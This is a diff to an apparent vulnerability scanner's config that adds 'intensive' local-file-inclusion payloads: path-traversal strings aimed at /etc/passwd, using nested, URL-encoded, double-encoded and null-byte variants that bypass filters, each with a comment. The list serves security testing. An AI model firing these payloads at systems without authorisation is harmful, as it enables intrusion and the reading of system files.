@@ -10,6 +10,16 @@ payloads:
   - "../../../../etc/passwd"
   - "../../../../../../etc/passwd"
   - "pyproject.toml"
+# Tried only when the planner marks lfi a priority (e.g. a PHP stack). Traversal/encoding variants that
+# defeat common path filters; each still resolves to /etc/passwd, so the SAME passwd-signature oracle
+# (plus catch_all_guard) confirms it — more filters bypassed, no new false positives.
+intensive_payloads:
+  - "....//....//....//....//etc/passwd"            # collapses to ../ after a strip-once filter
+  - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"         # URL-encoded separators
+  - "..%252f..%252f..%252fetc%252fpasswd"           # double URL-encoded (decoded twice upstream)
+  - "/etc/passwd"                                   # absolute path — no traversal filter to beat
+  - "../../../../../../../../../../etc/passwd"       # very deep traversal (short base dir)
+  - "../../../../etc/passwd%00"                      # legacy null-byte truncation (old PHP)
 oracle:
   type: any_of
   checks:
